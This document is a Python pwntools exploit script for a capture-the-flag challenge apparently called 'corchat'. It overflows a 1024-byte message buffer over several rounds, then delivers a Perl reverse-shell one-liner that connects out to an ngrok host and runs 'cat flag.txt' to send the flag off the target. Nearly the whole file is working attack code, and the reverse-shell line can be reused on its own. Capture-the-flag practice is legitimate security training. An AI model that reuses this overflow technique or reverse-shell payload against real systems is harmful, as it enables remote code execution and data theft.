from pwn import *
from time import sleep as z

#io = remote('127.0.0.1', 5000)

def _send(dat, size=1, flag=0):
    packet = b'_SEND_MSG'
    packet += p16(size)
    packet += p16(flag)
    packet += dat
    io.send(packet)

#io = remote('127.0.0.1', 5000)
io  = remote('pwn-corchat-5a27d2bda202de93.be.ax', 1337, ssl=True)
io.recv()
for i in range(8):
    #io = remote('pwn-corchat-08fbc438147e0d10.be.ax', 1337)
    #io = remote('127.0.0.1', 5000)
    log.info('Sending number '+str(i))
    #_send(b'A'*1024+p16(0)+p16(0x1e58-0x1100+i)+p32(0)+p8(0)*(i+1))
    _send(b'A'*1024+p16(0)+p16(0xd78+i)+p32(0)+p8(0)*(i+1))
    #io.close()
    sleep(1)
log.info('Done')
cmd = b'perl -e \'use Socket;$i="0.tcp.ap.ngrok.io";$p=14986;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cat flag.txt");};\'\0'
#cmd = b'cat flag.txt 1>&5\0'
print(cmd.decode())
_send(cmd+b'A'*(1024-len(cmd))+p16(0)+p16(0xd78+0x50)+p32(0)+p64(0)+p64(0)*3+b'\x14\x70')
print(io.recvall(timeout=1))
io.close()
